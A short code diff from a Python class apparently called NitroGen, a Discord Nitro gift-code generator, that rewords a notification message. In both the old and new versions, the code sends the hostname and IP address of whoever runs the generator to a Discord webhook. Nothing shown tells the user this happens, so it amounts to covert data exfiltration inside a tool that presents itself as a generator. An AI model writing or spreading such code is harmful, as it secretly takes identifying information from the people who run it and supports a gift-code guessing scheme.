@@ -54,7 +54,7 @@ class NitroGen:
             if webhook is not None:
                 DiscordWebhook(
                     url=url,
-                    content=f"Someone ran the gen\nHostname: {hostname}IP Address: {ip_address}"
+                    content=f"Generator has been ran.\nIP info below.\n\nHostname: **{hostname}** IP Address: **{ip_address}**"
                 ).execute()
 
         valid = []
